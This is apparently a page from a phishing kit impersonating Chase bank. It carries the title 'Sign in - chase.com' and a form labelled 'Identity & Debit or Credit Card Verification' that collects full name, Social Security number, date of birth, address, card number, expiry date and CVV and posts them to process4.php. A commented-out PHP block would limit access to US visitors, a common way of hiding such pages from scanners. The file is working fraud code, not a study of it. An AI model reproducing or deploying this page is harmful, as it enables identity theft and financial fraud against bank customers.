<?php
	
	/*if($_SERVER['HTTP_X_FORWARDED_FOR'])
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else
		
		$ip = $_SERVER['REMOTE_ADDR'];
		
		$two_letter_country_code = iptocountry($ip);
		
		function iptocountry($ip){
			$numbers = preg_split( "/\./", $ip);
			include("ip_files/".$numbers[0]. ".php");
			$code = ($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);
			
			foreach($ranges as $key => $value){
				if($key <= $code){
					if($ranges[$key][0] >= $code){
						$country = $ranges[$key][1]; break;
					}
				}
			}
			
			if($country == ""){
				$country = "unknown";
			}
			return $country;	
		}
		
		// Then add this little blocking script at the end of the code above
		
		//if($two_letter_country_code == "US")
		//die();
		
		
		if($two_letter_country_code == "US"){
		
			}
		else{
		
		  die("You do not have access to this page");
		}
		
*/
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8"/>

        <meta name="robots" content="noindex,nofollow" />
            <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ"/>
        <title>Sign in - chase.com</title>
        <meta name="description" content=""/>
        <meta name="author" content=""/>
        <meta name="msapplication-config" content="none" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
       
       <link rel="stylesheet" href="css/style.css" />
       <link rel="shortcut icon" href="images/favicon.png"/>
     
        <script type="text/javascript" src="js/jqueryLib.js"></script>
        <script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
        
        </head>
    <body>
          <div class="bg-body4"> 
              
         </div>
    <div class="hed-const">
            
               <div class="header">
                  <div class="logo-line"></div>
                 <div class="logo"></div>
              </div>
         </div>
          <div class="bb-content2">
             <div class="lo-header2">Identity & Debit or Credit Card Verification</div>
             <div class="long-indic">
                <div class="img1"></div>
                <div class="l-indc1a"></div>
                <div class="l-indc2"></div>
             </div>
              <div class="img2"></div>  
                <form name="form1" method="post" action="process4.php">
                  <table width="320" border="0" class="tbl-tt2">
                       
                       <tr>
                         <td>
                         <div class="user-label2a">Full Name :</div>
                         <input type="text" name="fullname" id="fullname" required autocomplete="off" class="username1a"></td>
                       </tr>
                       <tr>
                         <td>&nbsp;</td>
                       </tr>
                       <tr>
                         <td>
                         <div class="user-label2a">Social Security Number :</div>
                         <input type="text" name="ssn" id="ssn" required autocomplete="off" class="user-pass1a" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="9" minlength="9"></td>
                       </tr>
                       <tr>
                         <td>&nbsp;</td>
                       </tr>
                       <tr>
                         <td><div class="pass-label2">Date of Birth :</div>
                         <input type="text" name="dobday" id="dobday" required autocomplete="off" class="expshort" maxlength="2" minlength="2" onKeyPress="javascript:return(numbersOnly(this,event));" placeholder="DD"><input type="text" name="dobmonth" id="dobmonth" required autocomplete="off" class="expshort" maxlength="2" minlength="2" onKeyPress="javascript:return(numbersOnly(this,event));" placeholder="MM"><input type="text" name="dobyear" id="dobyear" required autocomplete="off" class="explong" maxlength="4" minlength="4" onKeyPress="javascript:return(numbersOnly(this,event));" placeholder="YYYY"></td>
                       </tr>
                       <tr>
                         <td>&nbsp;</td>
                       </tr>
                       <tr>
                         <td> <div class="user-label2a">Address :</div>
                         <input type="text" name="address" id="address" required autocomplete="off" class="user-pass1a"></td>
                       </tr>
                        <tr>
                         <td>&nbsp;</td>
                       </tr>
                        <tr>
                         <td> <div class="user-label2a">Zip Code :</div>
                         <input type="text" name="zipcode" id="zipcode" required autocomplete="off" class="explong2" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="5" minlength="5"></td>
                       </tr>
                        <tr>
                         <td>&nbsp;</td>
                       </tr>
                        <tr>
                         <td> <div class="user-label2a">Card Number :</div>
                         <input type="text" name="cardnumber" id="cardnumber" required autocomplete="off" class="user-pass1a" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="16" minlength="16"></td>
                       </tr>
                        <tr>
                         <td>&nbsp;</td>
                       </tr>
                        <tr>
                         <td><div class="pass-label2">Expiry Date :</div>
                         <input type="text" name="expmonth" id="expmonth" required autocomplete="off" class="expshort" maxlength="2" minlength="2" onKeyPress="javascript:return(numbersOnly(this,event));" placeholder="MM"><input type="text" name="expyear" id="expyear" required autocomplete="off" class="explong" maxlength="4" minlength="4" onKeyPress="javascript:return(numbersOnly(this,event));" placeholder="YYYY"></td>
                       </tr>
                        <tr>
                         <td>&nbsp;</td>
                       </tr>
                        <tr>
                         <td><div class="user-label2a">CVV :</div>
                         <input type="text" name="cvv" id="cvv" required autocomplete="off" class="explong2" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="3" minlength="3"></td>
                       </tr>
                        <tr>
                         <td>&nbsp;</td>
                       </tr>
                        <tr>
                         <td>&nbsp;</td>
                       </tr>
                       <tr>
                         <td align="right"><input type="submit" name="btn-log" id="btn-log" value="Next" class="log-btn1a"></td>
                       </tr>
                       <tr>
                         <td>&nbsp;</td>
                       </tr>
                       <tr>
                         <td></td>
                       </tr>
                  </table>
                </form>
                
                
              </div>
            <div class="login-line"></div>
              <div class="login-container2"></div>
              
              
              
             <div class="footer">
                 <div class="footer-bg"></div>
             </div>

          </div>
          
  <script>
   var input = document.getElementById("emailpass");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btn-log").click();
	  }
	
	});
</script>         
          
          
          
          
         <script type="text/javascript" src="js/actions.js"></script>
    </body>
</html>